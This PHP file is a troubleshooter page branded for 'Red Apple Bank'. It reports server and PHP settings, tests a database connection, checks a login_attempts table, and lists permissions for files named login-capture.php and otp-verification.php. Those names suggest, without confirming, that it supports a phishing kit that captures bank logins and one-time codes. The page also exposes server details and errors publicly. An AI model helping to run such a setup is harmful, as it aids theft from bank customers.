<?php
// Set error reporting for troubleshooting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Create a response array
$response = [
    'server_info' => [],
    'php_info' => [],
    'database_info' => [],
    'file_permissions' => []
];

// 1. Server Information
$response['server_info'] = [
    'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'script_path' => __FILE__,
    'is_cpanel' => (strpos($_SERVER['SERVER_SOFTWARE'] ?? '', 'cPanel') !== false || file_exists('/usr/local/cpanel')) ? 'Yes' : 'No'
];

// 2. PHP Information
$response['php_info'] = [
    'version' => phpversion(),
    'extensions' => get_loaded_extensions(),
    'mysqlnd_installed' => extension_loaded('mysqlnd') ? 'Yes' : 'No',
    'pdo_installed' => extension_loaded('pdo_mysql') ? 'Yes' : 'No',
    'json_support' => function_exists('json_encode') ? 'Yes' : 'No',
    'memory_limit' => ini_get('memory_limit'),
    'max_execution_time' => ini_get('max_execution_time')
];

// 3. Database Connection Test
$response['database_info']['connection_test'] = 'Not tested';
try {
    // Include the database connection file
    if(file_exists('db_connect.php')) {
        require_once('db_connect.php');
        $response['database_info']['connection_test'] = $conn->connect_error ? 'Failed: ' . $conn->connect_error : 'Success';
        
        // Check for the login_attempts table
        $result = $conn->query("SHOW TABLES LIKE 'login_attempts'");
        $response['database_info']['login_attempts_table'] = ($result && $result->num_rows > 0) ? 'Exists' : 'Missing';
        
        $conn->close();
    } else {
        $response['database_info']['connection_test'] = 'db_connect.php file not found';
    }
} catch (Exception $e) {
    $response['database_info']['connection_test'] = 'Exception: ' . $e->getMessage();
}

// 4. Check File Permissions
$files_to_check = [
    'index.html',
    'login-capture.php',
    'otp-verification.php',
    'db_connect.php',
    'error.log',
    '.' // Current directory
];

foreach ($files_to_check as $file) {
    if (file_exists($file)) {
        $response['file_permissions'][$file] = [
            'exists' => 'Yes',
            'readable' => is_readable($file) ? 'Yes' : 'No',
            'writable' => is_writable($file) ? 'Yes' : 'No',
            'permissions' => substr(sprintf('%o', fileperms($file)), -4)
        ];
    } else {
        $response['file_permissions'][$file] = ['exists' => 'No'];
    }
}

// Output format based on request type
if (isset($_GET['format']) && $_GET['format'] === 'json') {
    header('Content-Type: application/json');
    echo json_encode($response, JSON_PRETTY_PRINT);
} else {
    // HTML output
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Red Apple Bank Troubleshooter</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            h1, h2 { color: #750f23; }
            .section { margin-bottom: 30px; border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }
            th { background-color: #f2f2f2; }
            .success { color: green; }
            .error { color: red; }
            .warning { color: orange; }
            pre { background-color: #f5f5f5; padding: 10px; border-radius: 5px; overflow: auto; }
        </style>
    </head>
    <body>
        <h1>Red Apple Bank System Troubleshooter</h1>
        
        <div class="section">
            <h2>Server Information</h2>
            <table>
                <tr><th>Item</th><th>Value</th></tr>';
    
    foreach ($response['server_info'] as $key => $value) {
        echo "<tr><td>".ucwords(str_replace('_', ' ', $key))."</td><td>$value</td></tr>";
    }
    
    echo '</table>
        </div>
        
        <div class="section">
            <h2>PHP Information</h2>
            <table>
                <tr><th>Item</th><th>Value</th></tr>';
    
    foreach ($response['php_info'] as $key => $value) {
        if ($key === 'extensions') {
            echo "<tr><td>Extensions</td><td><pre>" . implode(', ', $value) . "</pre></td></tr>";
        } else {
            $class = '';
            if ($key === 'mysqlnd_installed' && $value === 'No') {
                $class = 'warning';
            }
            echo "<tr><td>".ucwords(str_replace('_', ' ', $key))."</td><td class='$class'>$value</td></tr>";
        }
    }
    
    echo '</table>
        </div>
        
        <div class="section">
            <h2>Database Information</h2>
            <table>
                <tr><th>Item</th><th>Value</th></tr>';
    
    foreach ($response['database_info'] as $key => $value) {
        $class = (strpos($value, 'Failed') !== false || strpos($value, 'Exception') !== false || $value === 'Missing') ? 'error' : 'success';
        echo "<tr><td>".ucwords(str_replace('_', ' ', $key))."</td><td class='$class'>$value</td></tr>";
    }
    
    echo '</table>
        </div>
        
        <div class="section">
            <h2>File Permissions</h2>
            <table>
                <tr><th>File</th><th>Exists</th><th>Readable</th><th>Writable</th><th>Permissions</th></tr>';
    
    foreach ($response['file_permissions'] as $file => $info) {
        echo "<tr><td>$file</td>";
        if ($info['exists'] === 'Yes') {
            $readClass = $info['readable'] === 'Yes' ? 'success' : 'error';
            $writeClass = $info['writable'] === 'Yes' ? 'success' : 'error';
            echo "<td>{$info['exists']}</td>
                  <td class='$readClass'>{$info['readable']}</td>
                  <td class='$writeClass'>{$info['writable']}</td>
                  <td>{$info['permissions']}</td>";
        } else {
            echo "<td class='error'>No</td><td>-</td><td>-</td><td>-</td>";
        }
        echo "</tr>";
    }
    
    echo '</table>
        </div>
        
        <div class="section">
            <h2>Common cPanel PHP 500 Error Solutions</h2>
            <ol>
                <li><strong>Update db_connect.php</strong> with the correct cPanel database credentials</li>
                <li><strong>Check PHP Version:</strong> Make sure your cPanel PHP version is at least 7.2+ (7.4+ recommended)</li>
                <li><strong>Enable Error Logging:</strong> In your .htaccess file add: <pre>php_flag display_errors on</pre></li>
                <li><strong>Set File Permissions:</strong> Set 644 for .php files, 755 for directories</li>
                <li><strong>MySQLi Driver:</strong> If mysqlnd shows as "No" above, contact your hosting provider</li>
                <li><strong>Review Error Logs:</strong> Check cPanel error logs for specific error messages</li>
            </ol>
        </div>
    </body>
    </html>';
}
?>
